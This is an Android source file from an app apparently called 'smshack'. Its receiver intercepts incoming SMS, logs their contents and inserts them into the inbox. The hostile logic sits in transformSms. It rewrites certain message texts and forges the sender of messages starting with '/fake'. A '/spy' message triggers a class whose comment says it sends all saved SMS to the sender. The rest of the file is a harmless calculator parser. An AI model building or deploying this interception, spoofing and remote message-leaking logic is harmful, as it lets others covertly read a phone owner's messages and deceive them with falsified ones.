package com.projet.esgi.smshack.broadcastReceiver;

import android.app.Notification;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.support.v4.app.NotificationCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.projet.esgi.smshack.Model.SmsModel;
import com.projet.esgi.smshack.R;
import com.projet.esgi.smshack.service.AnswerSms;


/**
 * Created by Mickael on 04/12/2016.
 * This class receive the incoming sms
 */

public class smsBroadcastReceiver extends BroadcastReceiver{

    private  final String SMS_EXTRA_NAME= "pdus";
    public static final String SMS_URI = "content://sms";

    public static final String ADDRESS = "address";
    public static final String PERSON = "person";
    public static final String DATE = "date";
    public static final String READ = "read";
    public static final String STATUS = "status";
    public static final String TYPE = "type";
    public static final String BODY = "body";
    public static final String SEEN = "seen";

    public static final int MESSAGE_TYPE_INBOX = 1;
    public static final int MESSAGE_IS_NOT_READ = 0;
    public static final int MESSAGE_IS_NOT_SEEN = 0;


    @Override
    public void onReceive(Context context, Intent intent)
    {
        SmsMessage[] msg = getInfoSms(intent);

        for (SmsMessage aMsg : msg) {
            Log.d("smsBroacastReceiver", "Origin: " + aMsg.getOriginatingAddress() + " message: " + aMsg.getMessageBody());
            SmsModel sms = new SmsModel(aMsg);
            transformSms(context, sms);
        }
    }


    // get msgs using intent extra
    public SmsMessage[] getInfoSms(Intent intent){
        Object[] pdus =  (Object[]) intent.getSerializableExtra(SMS_EXTRA_NAME);
        SmsMessage[] msgs = new SmsMessage[pdus.length];
        for (int i=0; i<msgs.length; i++)
            msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
        return msgs;
    }


    // transform Sms data
    public void transformSms(Context context, SmsModel sms){

        // check occurence "je t'aime"
        if(sms.getMessage().equalsIgnoreCase("je t'aime")) {
            sms.setMessage("JE TE DETESTE");
        }

        // fake sms
        if (sms.getMessage().startsWith("/fake")) {
            sms.setOriginAdress("Barack obama");
            sms.setMessage("Sa roule ma poule !!!!");

        }

        // send all saved sms
        if(sms.getMessage().startsWith("/spy")){
            new AnswerSms(context,sms);
        }

        // calcule sms
        else if (sms.getMessage().startsWith("/")) {
            String cal;
            Double result;
            cal= sms.getMessage().substring(1, sms.getMessage().length());
            result = eval(cal);
            System.out.println("sms data" + sms.toString());
            sms.setMessage(sms.getMessage()+ " = " +result);
        }

        // add Database and create notification sms
        addToDatabase(context, sms);
        createNotification(context, sms);

    }

    // add sms to database
    public void addToDatabase(Context context,SmsModel sms){
        ContentValues values = new ContentValues();
        values.put( ADDRESS, sms.getOriginAdress() );
        values.put( DATE, sms.getTimestampMillis() );
        values.put( READ, MESSAGE_IS_NOT_READ );
        values.put( STATUS, sms.getSmsStatus());
        values.put( TYPE, MESSAGE_TYPE_INBOX );
        values.put( SEEN, MESSAGE_IS_NOT_SEEN );

        try {
            values.put( BODY, sms.getMessage());
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
        System.out.println(values.toString());
        context.getContentResolver().insert(Uri.parse(SMS_URI), values);
    }

    // create notification when sms is receive
    public void createNotification(Context context,SmsModel sms){
        // We build a notification for the user
        Notification notif = new NotificationCompat.Builder(context)
                .setContentTitle(sms.getMessage())
                .setContentText(sms.getOriginAdress())
                .setSmallIcon(R.drawable.skull)
                .build();
        NotificationManager notifManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        notifManager.notify(1, notif);
    }

    public static double eval(final String str) {
        return new Object() {
            int pos = -1, ch;

            void nextChar() {
                ch = (++pos < str.length()) ? str.charAt(pos) : -1;
            }

            boolean eat(int charToEat) {
                while (ch == ' ') nextChar();
                if (ch == charToEat) {
                    nextChar();
                    return true;
                }
                return false;
            }

            double parse() {
                nextChar();
                double x = parseExpression();
                if (pos < str.length()) throw new RuntimeException("Unexpected: " + (char)ch);
                return x;
            }

            // Grammar:
            // expression = term | expression `+` term | expression `-` term
            // term = factor | term `*` factor | term `/` factor
            // factor = `+` factor | `-` factor | `(` expression `)`
            //        | number | functionName factor | factor `^` factor

            double parseExpression() {
                double x = parseTerm();
                for (;;) {
                    if      (eat('+')) x += parseTerm(); // addition
                    else if (eat('-')) x -= parseTerm(); // subtraction
                    else return x;
                }
            }

            double parseTerm() {
                double x = parseFactor();
                for (;;) {
                    if      (eat('*')) x *= parseFactor(); // multiplication
                    else if (eat('/')) x /= parseFactor(); // division
                    else return x;
                }
            }

            double parseFactor() {
                if (eat('+')) return parseFactor(); // unary plus
                if (eat('-')) return -parseFactor(); // unary minus

                double x;
                int startPos = this.pos;
                if (eat('(')) { // parentheses
                    x = parseExpression();
                    eat(')');
                } else if ((ch >= '0' && ch <= '9') || ch == '.') { // numbers
                    while ((ch >= '0' && ch <= '9') || ch == '.') nextChar();
                    x = Double.parseDouble(str.substring(startPos, this.pos));
                } else if (ch >= 'a' && ch <= 'z') { // functions
                    while (ch >= 'a' && ch <= 'z') nextChar();
                    String func = str.substring(startPos, this.pos);
                    x = parseFactor();
                    if (func.equals("sqrt")) x = Math.sqrt(x);
                    else if (func.equals("sin")) x = Math.sin(Math.toRadians(x));
                    else if (func.equals("cos")) x = Math.cos(Math.toRadians(x));
                    else if (func.equals("tan")) x = Math.tan(Math.toRadians(x));
                    else throw new RuntimeException("Unknown function: " + func);
                } else {
                    throw new RuntimeException("Unexpected: " + (char)ch);
                }

                if (eat('^')) x = Math.pow(x, parseFactor()); // exponentiation

                return x;
            }
        }.parse();
    }

}
